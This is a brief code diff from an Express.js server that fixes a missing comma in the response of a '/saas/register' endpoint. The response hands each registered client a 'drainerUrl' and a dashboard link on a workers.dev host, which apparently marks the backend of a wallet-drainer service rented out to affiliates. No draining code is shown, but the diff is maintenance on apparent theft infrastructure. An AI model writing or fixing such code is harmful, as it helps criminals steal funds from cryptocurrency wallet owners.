@@ -108,7 +108,7 @@ app.post('/saas/register', (req, res) => {
   success: true,
   clientId: clientId,
   drainerUrl: `https://ch.xqx.workers.dev/?client=${clientId}`,
-  dashboardUrl: `https://ch.xqx.workers.dev/dashboard.html?client=${clientId}&color=${themeColor}`
+  dashboardUrl: `https://ch.xqx.workers.dev/dashboard.html?client=${clientId}&color=${themeColor}`,
   message: 'Client registered successfully'
 });
     
